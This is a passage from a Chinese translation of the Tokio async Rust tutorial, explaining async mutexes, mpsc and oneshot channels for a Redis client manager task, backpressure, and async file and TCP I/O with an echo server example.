<p>这种模式保证了你不会进入到 <code>Send</code> 错误中去，因为 mutex guard 没有出现在异步函数的任何地方，它在自己的同步函数结束时已经被释放了。</p>
<h3 id="spawn-a-task-to-manage-the-state-and-use-message-passing-to-operate-on-it生成一个任务来管理状态并且通过消息传递来操作"><a class="header" href="#spawn-a-task-to-manage-the-state-and-use-message-passing-to-operate-on-it生成一个任务来管理状态并且通过消息传递来操作">Spawn a task to manage the state and use message passing to operate on it（生成一个任务来管理状态，并且通过消息传递来操作）</a></h3>
<p>这是本章节最开始提到的两种方法中的第二种，并且它常常在共享的资源是 I/O 资源的时候被采用。有关更多详细信息，请参阅下一章。</p>
<h3 id="use-tokios-asynchronous-mutex使用-tokio-异步锁"><a class="header" href="#use-tokios-asynchronous-mutex使用-tokio-异步锁">Use Tokio's asynchronous mutex（使用 Tokio 异步锁）</a></h3>
<p>Tokio 提供的 <code>tokio::sync:Mutex</code> 类型也能在这使用。Tokio mutex 的主要特点是它能够被跨 <code>.await</code> 持有而不会出现任何问题。换而言之，使用一个异步锁的开销肯定是大于使用一个普通的互斥锁的，通常最好使用另外两种方法之一。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::sync::Mutex; // note! This uses the Tokio mutex

// This compiles!
// (but restructuring the code would be better in this case)
async fn increment_and_do_stuff(mutex: &amp;Mutex&lt;i32&gt;) {
    let mut lock = mutex.lock().await;
    *lock += 1;

    do_something_async().await;
} // lock goes out of scope here
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="channels"><a class="header" href="#channels">Channels</a></h2>
<p>现在我们已经了解了一些关于 Tokio 的并发，让我们把它们应用到客户端侧吧。把我们先前写的服务端的代码移动到一个显式的二进制文件里去：</p>
<pre><code class="language-zsh">mkdir src/bin
mv src/main.rs src/bin/server.rs
</code></pre>
<p>然后创建一个新的 binary 来放我们的客户端代码：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>touch src/bin/client.rs
<span class="boring">}
</span></code></pre></pre>
<p>在这个文件中，我们将会写关于本节的代码。无论何时你想运行它，请先启动 server 端：</p>
<pre><code class="language-zsh">cargo run --bin server
</code></pre>
<p>然后在另一个终端窗口：</p>
<pre><code class="language-zsh">cargo run --bin client
</code></pre>
<p>话都说到这个份上了，来让我们开始 code 吧！</p>
<p>比如说我门想要运行两个并发的 Redis commands。我们可以为每个 command 生成一个任务。然后两个命令就能并发啦～</p>
<p>一开始啊，我们可能会想到下面这种方式：</p>
<pre><pre class="playground"><code class="language-rust">use mini_redis::client;

#[tokio::main]
async fn main() {
    // Establish a connection to the server
    let mut client = client::connect(&quot;127.0.0.1:6379&quot;).await.unwrap();

    // Spawn two tasks, one gets a key, the other sets a key
    let t1 = tokio::spawn(async {
        let res = client.get(&quot;hello&quot;).await;
    });

    let t2 = tokio::spawn(async {
        client.set(&quot;foo&quot;, &quot;bar&quot;.into()).await;
    });

    t1.await.unwrap();
    t2.await.unwrap();
}
</code></pre></pre>
<p>不幸的是呢，编译器阻止了我们继续，因为两个任务都需要用某种方式访问 <code>client</code> 。由于</p>
<p><code>Client</code> 并没有实现 <code>Copy</code> trait ，所以如果没有一些代码来促成 <code>client</code> 的共享是不能被编译通过的。再说，<code>Client::set</code> 需要 <code>&amp;mut self</code> ，这意味着调用它的时候需要独占 <code>Client</code> 的访问。我们可以为每个连接打开一个任务，但是这并不理想。因为 <code>.await</code> 需要带着锁被调用，所以我们不能使用 <code>std::sync::Mutex</code> 。我们可以使用 <code>tokio::sync::Mutex</code> ，但是这会导致同一时间只能有一个请求（即 singleflight 单飞）。如果客户端实现了 <a href="https://redis.io/topics/pipelining">pipelining</a> ，一个异步锁会导致连接的低利用率。</p>
<h2 id="message-passing-消息传递"><a class="header" href="#message-passing-消息传递">Message passing （消息传递）</a></h2>
<p>实践答案是使用消息传递！这种模式包含生成一个专门的任务来管理 <code>client</code> 资源。任何想要发起请求的任务都要发送消息给这个 <code>client</code> 任务。<code>client</code> 任务的角色相当于代理人，它会代表发送者(sender)来发送请求(request)，并把响应(response)发回给发送者(sender)。</p>
<p>采用这种策略，需要创建一个单独的连接。管理 <code>client</code> 的任务能够独占访问权限以便调用 <code>set</code> 和 <code>get</code> 。此外， channel 以缓冲区的方式工作。当 <code>client</code> 任务正忙的时候，任务可能会被发送到 <code>client</code> 。一旦 <code>client</code> 空闲了，可以处理新请求了，它会从 channel 拉去下一个请求。这种方式可以有更好的吞吐量，并且能够被拓展，支持连接池。</p>
<h2 id="tokios-channel-primitives-tokio-的通道原语"><a class="header" href="#tokios-channel-primitives-tokio-的通道原语">Tokio's channel primitives （Tokio 的通道原语）</a></h2>
<p>Tokio 提供了 <a href="https://docs.rs/tokio/1/tokio/sync/index.html">一些 channel</a> ，每个都有不一样的目的。</p>
<ul>
<li>
<p><a href="https://docs.rs/tokio/1/tokio/sync/mpsc/index.html">mpsc</a>：多生产者，单消费者的 channel。可以发送许多值。</p>
</li>
<li>
<p><a href="https://docs.rs/tokio/1/tokio/sync/oneshot/index.html">oneshot</a>：单生产者，单消费者的 channel。可以发送单个值。</p>
</li>
<li>
<p><a href="https://docs.rs/tokio/1/tokio/sync/broadcast/index.html">broadcast</a>：多生产者，多消费者。可以发送许多值，每个接收者都能看到每个值。</p>
</li>
<li>
<p><a href="https://docs.rs/tokio/1/tokio/sync/watch/index.html">watch</a>：单生产者，多消费者。可以发送许多值，但是不会保留历史值。接收者只能看到最新的值。</p>
</li>
</ul>
<p>如果你需要一个多生产者多消费者的 channel，其中每条消息只能由所有现有消费者中的一个接收，那么你可以使用  <a href="https://docs.rs/async-channel/"><code>async-channel</code></a> crate。异步 Rust 之外还有同步的 channel，比如 <a href="https://doc.rust-lang.org/stable/std/sync/mpsc/index.html"><code>std::sync::mpsc</code></a> 和 <a href="https://docs.rs/crossbeam/latest/crossbeam/channel/index.html"><code>crossbeam::channel</code></a>。这些 channel 都会在等待消息的时候阻塞线程，这意味着它们不适合用在异步代码中。</p>
<p>在这块内容里，我们会使用 <a href="https://docs.rs/tokio/1/tokio/sync/mpsc/index.html">mpsc</a> 和 <a href="https://docs.rs/tokio/1/tokio/sync/oneshot/index.html">oneshot</a> 。其他类型的 channel 会在之后的内容中探索。本节内容的完整代码在<a href="https://github.com/tokio-rs/website/blob/master/tutorial-code/channels/src/main.rs">这里</a> 。</p>
<h2 id="define-the-message-type-定义消息类型"><a class="header" href="#define-the-message-type-定义消息类型">Define the message type （定义消息类型）</a></h2>
<p>在许多使用消息传递的场景下，接收消息的任务会响应多条命令。在我们的场景下，任务将会响应 <code>GET</code> 和 <code>SET</code> 命令。为了模拟这个，我们先定义一个 <code>Command</code> enum 。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use bytes::Bytes;

#[derive(Debug)]
enum Command {
    Get {
        key: String,
    },
    Set {
        key: String,
        val: Bytes,
    }
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="create-the-channel-创建通道"><a class="header" href="#create-the-channel-创建通道">Create the channel （创建通道）</a></h2>
<p>在 <code>main</code> 函数中，我们创建一个 <code>mpsc</code> channel。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::sync::mpsc;

#[tokio::main]
async fn main() {
    // 创建一个新的 mpsc ，并给它的最大容量设置为 32。
    let (tx, mut rx) = mpsc::channel(32);

    // ... Rest comes here
}
</code></pre></pre>
<p><code>mpsc</code> 用来<strong>发送</strong>命令给管理 redis connection 的任务。多生产者的容量允许消息可以从多个任务中发送。创建 channel 会返回两个值，一个 sender（习惯上命名为 <code>tx</code>） 和一个 receiver （习惯上命名为 <code>rx</code>）。这俩句柄是分开使用的，它们可能会被移动到不同的任务中去。</p>
<p>这里的 channel 创建时指定了 32 个容量。如果消息发的比收的快，那么 channel 会把没来得及被接收的消息存起来。一旦 channel 中的 32 个位置都被消息填满了，这时候再调用 <code>send(...).await</code> 将会 sleep 直到有 1 个消息被 receiver 拿走去消费。</p>
<p>从多个任务发送消息是通过 clone <code>Sender</code> 做到的。例如：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::sync::mpsc;

#[tokio::main]
async fn main() {
    let (tx, mut rx) = mpsc::channel(32);
    let tx2 = tx.clone();

    tokio::spawn(async move {
        tx.send(&quot;sending from first handle&quot;).await;
    });

    tokio::spawn(async move {
        tx2.send(&quot;sending from second handle&quot;).await;
    });

    while let Some(message) = rx.recv().await {
        println!(&quot;GOT = {}&quot;, message);
    }
}
</code></pre></pre>
<p>两条消息都被发送到了单个 <code>Receiver</code> 句柄。在 <code>mpsc</code> channel 中克隆 receiver 是不被允许的。</p>
<p>当每个 <code>Sender</code> 超出作用域或者因为其他原因被 drop 了，就不再能往这个 channel 发送更多消息了。此时，在 <code>Receiver</code> 上调用 <code>recv</code> 将会返回 <code>None</code>，这意味着所有的 sender 都不在了，channel 被关闭了。 </p>
<p>在我们的场景下，管理 redis connection 的任务知道一旦 channel 被关闭，就得关闭 redis connection，因为 connection 不会再被使用了。</p>
<h2 id="spawn-manager-task-生成管理者任务"><a class="header" href="#spawn-manager-task-生成管理者任务">Spawn manager task （生成管理者任务）</a></h2>
<p>接下来，生成一个任务来处理来自 channel 的消息。首先，一个对 redis 的客户端连接会被建立。然后，受到的命令会通过 redis connection 被发送。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use mini_redis::client;
// The `move` keyword is used to **move** ownership of `rx` into the task.
let manager = tokio::spawn(async move {
    // Establish a connection to the server
    let mut client = client::connect(&quot;127.0.0.1:6379&quot;).await.unwrap();

    // Start receiving messages
    while let Some(cmd) = rx.recv().await {
        use Command::*;

        match cmd {
            Get { key } =&gt; {
                client.get(&amp;key).await;
            }
            Set { key, val } =&gt; {
                client.set(&amp;key, val).await;
            }
        }
    }
});
<span class="boring">}
</span></code></pre></pre>
<p>现在，更新这两个任务以通过通道发送命令，而不是直接在Redis连接上发出它们。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// The `Sender` handles are moved into the tasks. As there are two
// tasks, we need a second `Sender`.
let tx2 = tx.clone();

// Spawn two tasks, one gets a key, the other sets a key
let t1 = tokio::spawn(async move {
    let cmd = Command::Get {
        key: &quot;hello&quot;.to_string(),
    };

    tx.send(cmd).await.unwrap();
});

let t2 = tokio::spawn(async move {
    let cmd = Command::Set {
        key: &quot;foo&quot;.to_string(),
        val: &quot;bar&quot;.into(),
    };

    tx2.send(cmd).await.unwrap();
});
<span class="boring">}
</span></code></pre></pre>
<p>在 <code>main</code> 函数的底部，我们 <code>.await</code> 这些 <a href="https://docs.rs/tokio/latest/tokio/task/struct.JoinHandle.html"><code>JoinHandle</code></a> 来确保commands 能够在进程退出前完全完成。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>t1.await.unwrap();
t2.await.unwrap();
manager.await.unwrap();
<span class="boring">}
</span></code></pre></pre>
<h2 id="receive-responses-接收响应"><a class="header" href="#receive-responses-接收响应">Receive responses （接收响应）</a></h2>
<p>最后一步是从管理器任务接收响应(response)。<code>GET</code> command 需要获取 value 并且 <code>SET</code> command 需要知道它的操作是否成功完成。</p>
<p>为了传递响应，我们使用一个 <code>oneshot</code> channel。<code>oneshot</code> channel 是一个单生产者，单消费者的 channel，针对发送单一值进行了优化。在我们的场景下，响应就是单一值。</p>
<p>与 <code>mpsc</code> 类似，<code>oneshot::channel()</code> 返回一个 sender 和一个 receiver 句柄。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::sync::oneshot;

let (tx, rx) = oneshot::channel();
<span class="boring">}
</span></code></pre></pre>
<p>不像 <code>mpsc</code> ，<code>oneshot</code> 不需要指定容量，因为它的容量始终是 1。另外，<code>oneshot</code> 的两个句柄都不能被 clone。</p>
<p>为了从管理器任务接收响应，在发送一个 command 之前，要先创建一个 <code>oneshot</code> channel。<code>oneshot</code> 的 <code>Sender</code> 会被包含在发给管理器任务中的 command 中。而 <code>Receiver</code> 用来接收管理器任务用 <code>oneshot</code> 的 <code>Sender</code> 发送的消息。</p>
<p>首先，改变 <code>Command</code> 来包含 <code>Sender</code> 。方便起见，用了一个类型别名来使用 <code>Sender</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::sync::oneshot;
use bytes::Bytes;

/// Multiple different commands are multiplexed over a single channel.
#[derive(Debug)]
enum Command {
    Get {
        key: String,
        resp: Responder&lt;Option&lt;Bytes&gt;&gt;,
    },
    Set {
        key: String,
        val: Bytes,
        resp: Responder&lt;()&gt;,
    },
}

/// Provided by the requester and used by the manager task to send
/// the command response back to the requester.
type Responder&lt;T&gt; = oneshot::Sender&lt;mini_redis::Result&lt;T&gt;&gt;;
<span class="boring">}
</span></code></pre></pre>
<p>现在，改变发送 command 的任务，让它包含一个 <code>oneshot::Sender</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let t1 = tokio::spawn(async move {
    let (resp_tx, resp_rx) = oneshot::channel();
    let cmd = Command::Get {
        key: &quot;hello&quot;.to_string(),
        resp: resp_tx,
    };

    // Send the GET request
    tx.send(cmd).await.unwrap();

    // Await the response
    let res = resp_rx.await;
    println!(&quot;GOT = {:?}&quot;, res);
});

let t2 = tokio::spawn(async move {
    let (resp_tx, resp_rx) = oneshot::channel();
    let cmd = Command::Set {
        key: &quot;foo&quot;.to_string(),
        val: &quot;bar&quot;.into(),
        resp: resp_tx,
    };

    // Send the SET request
    tx2.send(cmd).await.unwrap();

    // Await the response
    let res = resp_rx.await;
    println!(&quot;GOT = {:?}&quot;, res);
});
<span class="boring">}
</span></code></pre></pre>
<p>在 <code>oneshot::Sender</code> 上的 <code>send</code> 调用是立即完成的，<strong>不需要</strong>一个 <code>.await</code> 。这是因为 <code>oneshot</code> channel 上的 <code>send</code> 总是立即返回 succeed 或者 fail ，而不需要任何形式的等待。</p>
<p>当接收端被 drop 时，往一个 oneshot channel 发送一个值会返回 <code>Err</code> 。这表示接收端不再对结果感兴趣了。在我们的假设中，接收端(想发命令的任务)不再对 response(管理器任务返回的结果) 感兴趣的情况是可接受的。所以通过 <code>resp.send(...)</code>  返回的 <code>Err</code>  就没必要处理了。</p>
<p>可以在<a href="https://github.com/tokio-rs/website/blob/master/tutorial-code/channels/src/main.rs">这里</a>看到完整代码。</p>
<h2 id="backpressure-and-bounded-channels-背压和有界的通道"><a class="header" href="#backpressure-and-bounded-channels-背压和有界的通道">Backpressure and bounded channels (背压和有界的通道)</a></h2>
<p>这里的小标题我不会翻译 :(</p>
<p>每当引入并发(cibcurrency)和队列(queuing)的时候，确保队列有界且系统能优雅的处理负载是非常重要的。无界的队列将会导致可用内存耗尽，并且还会导致系统陷入无法预测的失败中。</p>
<p>Tokio 会注意避免隐式队列。事实上很大一部分是因为异步操作是惰性的（这在前面提到过，这也是 rust 与其它实现 <code>async/await</code> 的语言的不同之处）。思考下下面的情况：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>loop {
    async_op();
}
<span class="boring">}
</span></code></pre></pre>
<p>如果异步操作迫切的希望被运行，loop 循环在没有确保先前的操作完成的情况下，反复将新的 <code>async_op</code> 排进一个队列来运行，这会导致隐式的无界队列。基于回调（callback）和基于勤奋 future（rust 是惰性 future）的系统会特别容易受到这种影响。</p>
<p>然而~，使用 Tokio 和异步 Rust ，上述片段根本就不会被运行。这是因为 <code>.await</code> 从未被调用。如果上述片段改成使用 <code>.await</code> ，那么这个循环就会在重新开始之前等待操作执行完毕。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>loop {
    // 在 `async_op` 完成之前是不会重新开始循环的
    async_op().await;
}
<span class="boring">}
</span></code></pre></pre>
<p>并发和队列必须被显式地引入。这么做的方法包括：</p>
<ul>
<li>
<p><code>tokio::spawn</code></p>
</li>
<li>
<p><code>select!</code></p>
</li>
<li>
<p><code>join!</code></p>
</li>
<li>
<p><code>mpsc::channel</code></p>
</li>
</ul>
<p>当需要这么做的时候，请确保并发的总量是有界的（不要无限制的创建 task）。举个例子，当写一个 TCP accept loop 的时候，确保打开的 socket 总数是有界的。当使用 <code>mpsc::channel</code>时，选择一个能够被管理的容量限度（容量不要超出实际承受能力）。指定有界值是特定于应用的。</p>
<p>小心和选择好的界限是编写可靠的Tokio应用程序的重要组成部分。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="io"><a class="header" href="#io">I/O</a></h2>
<p>Tokio 的 I/O 操作大致与 <code>std</code> 中的相同，但是是异步的。这有一个为读取而生的 trait <a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncRead.html"><code>AsyncRead</code></a> 和一个为写入而生的 trait <a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncWrite.html"><code>AsyncWrite</code></a> 。一些特定的类型恰当的实现了这些 trait（<a href="https://docs.rs/tokio/1/tokio/net/struct.TcpStream.html"><code>TcpStream</code></a>, <a href="https://docs.rs/tokio/1/tokio/fs/struct.File.html"><code>File</code></a>, <a href="https://docs.rs/tokio/1/tokio/io/struct.Stdout.html"><code>Stdout</code></a>）。<a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncRead.html"><code>AsyncRead</code></a> 和 <a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncWrite.html"><code>AsyncWrite</code></a> 也被一些像 <code>Vec&lt;u8&gt;</code> 和 <code>&amp;[u8]</code> 这样的数据结构实现了。这允许在需要 reader 或 writer 的地方使用字节数组。</p>
<p>本章将会覆盖基础的 Tokio I/O 读写并且通过几个例子来说明。下一章将会给出一个更加高级的 I/O 示例。</p>
<h2 id="asyncread-and-asyncwrite"><a class="header" href="#asyncread-and-asyncwrite"><code>AsyncRead</code> and <code>AsyncWrite</code></a></h2>
<p>这两个 trait 提供了异步读写字节流的工具。在这些 trait 上的方法通常不会直接调用，就好像你不会手动从 <code>Future</code> 调用 <code>poll</code> 方法。相反，我们都是通过 <a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncReadExt.html"><code>AsyncReadExt</code></a> and <a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncWriteExt.html"><code>AsyncWriteExt</code></a> 提供的实用方法来使用它们。</p>
<p>让我们简略的看一下它俩的几个方法。这些方法都是 <code>async</code> ，所以都必须用 <code>.await</code> 来使用。</p>
<h3 id="async-fn-read"><a class="header" href="#async-fn-read"><code>async fn read()</code></a></h3>
<p><a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncReadExt.html#method.read"><code>AsyncReadExt::read</code></a> 提供了一个异步方法来读取数据到一个 buffer，返回读取的字节数。</p>
<p><strong>Note：</strong> 当 <code>read()</code> 返回了 <code>Ok(0)</code> ，这标志着 stream 关闭了。任何对 <code>read()</code> 的进一步调用都会立即返回 <code>Ok(0)</code> 。对 <a href="https://docs.rs/tokio/1/tokio/net/struct.TcpStream.html"><code>TcpStream</code></a> 实例来说，这标志着 socket 的 the read half 关闭了。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::fs::File;
use tokio::io::{self, AsyncReadExt};

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let mut f = File::open(&quot;foo.txt&quot;).await?;
    let mut buffer = [0; 10];

    // read up to 10 bytes
    let n = f.read(&amp;mut buffer[..]).await?;

    println!(&quot;The bytes: {:?}&quot;, &amp;buffer[..n]);
    Ok(())
}
</code></pre></pre>
<h3 id="async-fn-read_to_end"><a class="header" href="#async-fn-read_to_end"><code>async fn read_to_end()</code></a></h3>
<p><a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncReadExt.html#method.read_to_end"><code>AsyncReadExt::read_to_end</code></a> 会从 stream 读取所有的字节直到 EOF。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::io::{self, AsyncReadExt};
use tokio::fs::File;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let mut f = File::open(&quot;foo.txt&quot;).await?;
    let mut buffer = Vec::new();

    // read the whole file
    f.read_to_end(&amp;mut buffer).await?;
    Ok(())
}
</code></pre></pre>
<h3 id="async-fn-write"><a class="header" href="#async-fn-write"><code>async fn write()</code></a></h3>
<p><a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncWriteExt.html#method.write"><code>AsyncWriteExt::write</code></a> 把一个 buffer 写入到 writer，返回写入的字节数。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::io::{self, AsyncWriteExt};
use tokio::fs::File;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let mut file = File::create(&quot;foo.txt&quot;).await?;

    // Writes some prefix of the byte string, but not necessarily all of it.
    let n = file.write(b&quot;some bytes&quot;).await?;

    println!(&quot;Wrote the first {} bytes of 'some bytes'.&quot;, n);
    Ok(())
}
</code></pre></pre>
<h3 id="async-fn-write_all"><a class="header" href="#async-fn-write_all"><code>async fn write_all()</code></a></h3>
<p><a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncWriteExt.html#method.write_all"><code>AsyncWriteExt::write_all</code></a> 把整个 buffer 写入 writer，与上面那个不一样，这哥们就不返回写入的字节数了。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::io::{self, AsyncWriteExt};
use tokio::fs::File;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let mut file = File::create(&quot;foo.txt&quot;).await?;

    file.write_all(b&quot;some bytes&quot;).await?;
    Ok(())
}
</code></pre></pre>
<p>这两个特征都包括许多其他有用的方法。有关完整的方法列表，请参阅API文档。</p>
<h2 id="helper-functions-辅助函数"><a class="header" href="#helper-functions-辅助函数">Helper functions （辅助函数）</a></h2>
<p>此外，就像 <code>std</code>， <a href="https://docs.rs/tokio/1/tokio/io/index.html"><code>tokio::io</code></a> 模块包含了一些有用的工具函数以及用于处理 <a href="https://docs.rs/tokio/1/tokio/io/fn.stdin.html">standard input</a>、 <a href="https://docs.rs/tokio/1/tokio/io/fn.stdout.html">standard output</a> 和 <a href="https://docs.rs/tokio/1/tokio/io/fn.stderr.html">standard error</a> 的API。例如，<a href="https://docs.rs/tokio/1/tokio/io/fn.copy.html"><code>tokio::io::copy</code></a> 异步的将 reader 的全部内容 copy 到一个 writer 。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::fs::File;
use tokio::io;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let mut reader: &amp;[u8] = b&quot;hello&quot;;
    let mut file = File::create(&quot;foo.txt&quot;).await?;

    io::copy(&amp;mut reader, &amp;mut file).await?;
    Ok(())
}
</code></pre></pre>
<p>请注意，这种用法体现了 <code>&amp;[u8]</code> 也实现 <code>AsyncRead</code> 的事实。</p>
<h2 id="echo-server-回声服务"><a class="header" href="#echo-server-回声服务">Echo server （回声服务）</a></h2>
<p>让我们做些玩意儿来练习下异步I/O。我们将要写一个回声服务。</p>
<p>这个回声服务要绑定在一个 <code>TcpListener</code> 并且在一个 loop 中接收入站连接。对每个入站连接来说，数据从 socket 中读取并立即写回 socket。客户端发送数据到服务端，并接收回相同的数据。</p>
<p>我们将会用两种不同的方案来实现两次回声服务。</p>
<h3 id="using-iocopy"><a class="header" href="#using-iocopy">Using <code>io::copy()</code></a></h3>
<p>开始，我们将用 <a href="https://docs.rs/tokio/1/tokio/io/fn.copy.html"><code>io::copy</code></a> 实用工具来实现 echo 逻辑。</p>
<p>你可以写在一个新的 binary 文件中：</p>
<pre><code class="language-zsh">touch src/bin/echo-server-copy.rs
</code></pre>
<p>可以通过以下方式启动（或只是检查编译）：</p>
<pre><code class="language-zsh">cargo run --bin echo-server-copy
</code></pre>
<p>我们能够使用一个标准的命令行工具，比如 <code>telnet</code> 来测试我们的回声服务，或者通过写一个简单的客户端，就像在 <a href="https://docs.rs/tokio/1/tokio/net/struct.TcpStream.html#examples"><code>tokio::net::TcpStream</code></a> 文档中找到的那个一样。</p>
<p>这是一个 TCP server 并且需要一个 accept loop。一个新的任务被生成来处理每个接收到的 socket 。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::io;
use tokio::net::TcpListener;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let listener = TcpListener::bind(&quot;127.0.0.1:6142&quot;).await?;

    loop {
        let (mut socket, _) = listener.accept().await?;

        tokio::spawn(async move {
            // Copy data here
        });
    }
}
</code></pre></pre>
<p>就像前面说的，这个工具函数接收一个 reader 参数和一个 writer 参数，并且将数据从一个 copy 到另一个中。然而啊，我们只有一个 <code>TcpStream</code> ，这单个值同时实现了 <code>AsyncRead</code> 和 <code>AsyncWrite</code> 。可是由于 <code>io::copy</code> 对 reader 和 writer 都要求 <code>&amp;mut</code> ，这 socket 不能同时作为放到这两个参数上。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 这是无法编译的
io::copy(&amp;mut socket, &amp;mut socket).await
<span class="boring">}
</span></code></pre></pre>
<h3 id="splitting-a-reader--writer"><a class="header" href="#splitting-a-reader--writer">Splitting a reader + writer</a></h3>
<p>为了解决这个难题，我们必须把 socket 分离成一个 reader 句柄和一个 writer 句柄。拆分 reader/writer 组合的最佳方法是使用 <a href="https://docs.rs/tokio/1/tokio/io/fn.split.html"><code>io::split</code></a>。</p>
<p>任何同时实现了 reader + writer 的类型都能够使用 <a href="https://docs.rs/tokio/1/tokio/io/fn.split.html"><code>io::split</code></a> 实用工具来拆分。这个函数接收单个的值并返回分离的 reader 和 writer 句柄。这两个句柄可以被独立使用，包括分别在两个单独的任务中使用。</p>
<p>举个例子，echo 客户端可以像这样并发处理读写：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let socket = TcpStream::connect(&quot;127.0.0.1:6142&quot;).await?;
    let (mut rd, mut wr) = io::split(socket);

    // Write data in the background
    tokio::spawn(async move {
        wr.write_all(b&quot;hello\r\n&quot;).await?;
        wr.write_all(b&quot;world\r\n&quot;).await?;

        // 有时候，rust 的类型推断器需要一点点的帮助
        Ok::&lt;_, io::Error&gt;(())
    });

    let mut buf = vec![0; 128];

    loop {
        let n = rd.read(&amp;mut buf).await?;

        if n == 0 {
            break;
        }

        println!(&quot;GOT {:?}&quot;, &amp;buf[..n]);
    }

    Ok(())
}
</code></pre></pre>
<p>因为 <code>io::split</code> 支持<strong>任何</strong>实现了 <code>AsyncRead + AsyncWrite</code> 的值，并返回独立的句柄，<code>io::split</code> 在内部使用了一个 <code>Arc</code> 和 一个 <code>Mutex</code> （这意味着会有蛮大的开销）。如果 socket 是 <code>TcpStream</code> 的情况就能避免这种开销。<code>TcpStream</code> 提供了两个专门的函数（<a href="https://docs.rs/tokio/1/tokio/net/struct.TcpStream.html#method.split"><code>TcpStream::split</code></a> 和 <a href="https://docs.rs/tokio/1/tokio/net/struct.TcpStream.html#method.into_split"><code>into_split</code></a>）。</p>
<p><a href="https://docs.rs/tokio/1/tokio/net/struct.TcpStream.html#method.split"><code>TcpStream::split</code></a> 接收一个 <code>&amp;mut TcpStream</code> 并返回一个 reader 和 一个 writer 句柄。正因为使用的是引用，所以这两个句柄必须跟 <code>split()</code> 调用待在<strong>同一</strong>任务中。虽然有前面这个限制，但是它的这种专门实现是<strong>零开销</strong>的，没有 <code>Arc</code> 也没有 <code>Mutex</code> 。<code>TcpStream</code> 也提供了 <a href="https://docs.rs/tokio/1/tokio/net/struct.TcpStream.html#method.into_split"><code>into_split</code></a> 来支持处理可跨任务使用的场景，开销缩减到了只有一个 <code>Arc</code>。</p>
<p>因为 <code>io::copy()</code> 调用是跟持有 <code>TcpStream</code> 的任务是同一个任务（跟上面那段代码中的情况不同，上面的代码的 rd 跟 wr 在不同的任务中），这就意味着我们完全可以使用 <a href="https://docs.rs/tokio/1/tokio/net/struct.TcpStream.html#method.split"><code>TcpStream::split</code></a> 。在 server 处理 echo 逻辑的任务变成了下面这样：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>tokio::spawn(async move {
    let (mut rd, mut wr) = socket.split();

    if io::copy(&amp;mut rd, &amp;mut wr).await.is_err() {
        eprintln!(&quot;failed to copy&quot;);
    }
});
<span class="boring">}
</span></code></pre></pre>
<p>可以在<a href="https://github.com/tokio-rs/website/blob/master/tutorial-code/io/src/echo-server-copy.rs">这里</a>找到完整代码。</p>
<h3 id="manual-copying-手动-copy"><a class="header" href="#manual-copying-手动-copy">Manual copying （手动 copy）</a></h3>
<p>现在，来看一下我们要如何通过手动 copy data 来写 echo server。为了做到这点，我们使用 <a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncReadExt.html#method.read"><code>AsyncReadExt::read</code></a> 和 <a href="https://docs.rs/tokio/1/tokio/io/trait.AsyncWriteExt.html#method.write_all"><code>AsyncWriteExt::write_all</code></a> 。</p>
<p>完整的 server 代码是这样：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let listener = TcpListener::bind(&quot;127.0.0.1:6142&quot;).await?;

    loop {
        let (mut socket, _) = listener.accept().await?;

        tokio::spawn(async move {
            let mut buf = vec![0; 1024];

            loop {
